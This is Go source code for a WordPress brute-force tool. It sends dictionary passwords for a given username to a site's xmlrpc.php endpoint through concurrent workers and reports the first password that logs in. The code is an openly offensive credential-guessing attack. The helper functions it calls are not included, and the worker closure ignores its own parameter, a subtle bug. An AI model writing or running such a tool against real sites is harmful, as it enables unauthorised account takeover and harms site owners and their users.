package main

import (
  "fmt"
  "log"
)

func main() {
  args := parseCommandlineArgs()

  passwords := make(chan string)
  go getPasswords(args["dict"].(string), passwords)

  url := fmt.Sprintf("%s/xmlrpc.php", args["url"].(string))
  results := make(chan Result)

  log.Printf("Initiating Requests...\n")

  username := args["username"].(string)
  maxWorkers := args["maxWorkers"].(int)

  executor(url, username, passwords, results, maxWorkers)

  attempts := 1
  for {
    result := <-results

    fmt.Printf("Password Attempts: %d\r", attempts)
    attempts++

    if result.Success {
      fmt.Println()
      log.Printf("Password Found: %s\n", result.Credentials.Password)
      break
    }
  }
}

func executor(url string, username string, passwords <-chan string, results chan<- Result, maxWorkers int) {
  sem := make(chan int, maxWorkers)

  for password := range passwords {
    credentials := Credentials{username, password}

    go func(creds Credentials) {
      sem <- 1
      result := attemptLogin(url, credentials)
      results <- result
      <-sem
    }(credentials)
  }
}
